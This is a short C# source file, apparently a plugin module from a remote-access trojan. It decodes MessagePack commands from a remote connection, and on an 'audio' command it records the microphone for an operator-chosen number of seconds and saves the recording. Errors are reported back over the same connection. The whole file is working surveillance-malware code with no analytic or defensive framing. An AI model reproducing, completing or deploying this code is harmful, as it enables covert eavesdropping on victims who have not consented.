using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.ComponentModel;
using System.Data;

namespace Plugin
{
    public static class Packet
    {
        
        public static void Read(object data)
        {
            MsgPack unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
            {
                case "audio":
                    {
                        var AR = new AudioRecorder();
                        AR.StartAR();
                        Thread.Sleep(100);
                        DateTime dt1 = DateTime.Now;
                        while ((DateTime.Now - dt1).TotalMilliseconds < Convert.ToInt32(unpack_msgpack.ForcePathObject("Second").AsString) * 1000)
                        {
                            continue;
                        };
                        AR.SaveAR();
                        break;
                    }
            }
        }
        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

    
}
